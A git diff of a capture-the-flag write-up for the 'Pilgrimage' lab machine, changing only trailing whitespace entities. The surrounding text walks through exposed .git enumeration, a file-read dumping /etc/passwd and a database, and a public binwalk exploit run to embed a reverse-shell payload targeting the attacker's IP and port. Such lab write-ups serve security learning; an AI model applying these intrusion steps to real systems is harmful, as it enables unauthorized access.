@@ -16,7 +16,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-We have to add `pilgrimage.htb` to our `/etc/hosts` file to view the web application.&#x20;
+We have to add `pilgrimage.htb` to our `/etc/hosts` file to view the web application.
 
 ### Image Shrinker -> .git
 
@@ -28,7 +28,7 @@ If we upload an image, we would get back a URL:
 
 <figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
 
-Interesting! This image is probably being passed somewhere into a command line instance. Anyways, before going that route, I did a directory and subdomain enumeration first using `gobuster` and `wfuzz`.&#x20;
+Interesting! This image is probably being passed somewhere into a command line instance. Anyways, before going that route, I did a directory and subdomain enumeration first using `gobuster` and `wfuzz`.
 
 A few directories were picked up by the more popular wordlists, but all led to nothing much. I ran one with the `dirsearch.txt` wordlist, and found that a `.git` directory exists on the machine:
 
@@ -180,7 +180,7 @@ If we convert this to text, we would get the `/etc/passwd` file, meaning it work
 
 <figure><img src="../../.gitbook/assets/image (1392).png" alt=""><figcaption></figcaption></figure>
 
-Now we can replace the file with `/var/db/pilgrimage`. This would give us a humongous hex output, and after removing the irrelevant parts, we can convert it using `xxd` to get a SQLite file.&#x20;
+Now we can replace the file with `/var/db/pilgrimage`. This would give us a humongous hex output, and after removing the irrelevant parts, we can convert it using `xxd` to get a SQLite file.
 
 {% code overflow="wrap" %}
 ```
@@ -230,7 +230,7 @@ blacklist=("Executable script" "Microsoft executable")
 done
 ```
 
-This uses `inotifywait` to wait for files present in the `/shrunk` directory (which is where images uploaded are stored), and then it uses `binwalk` on them to make sure that there's no hidden stuff within it.&#x20;
+This uses `inotifywait` to wait for files present in the `/shrunk` directory (which is where images uploaded are stored), and then it uses `binwalk` on them to make sure that there's no hidden stuff within it.
 
 We can enumerate the version of `binwalk` being used:
 
@@ -246,7 +246,7 @@ There are public RCE exploits for this particular version:
 
 {% embed url="https://vulners.com/packetstorm/PACKETSTORM:171724" %}
 
-We can use this script to embed a payload within an empty image (run `touch sample.png`).&#x20;
+We can use this script to embed a payload within an empty image (run `touch sample.png`).
 
 ```
 $ python3 pe_rce.py sample.png 10.10.14.86 4444
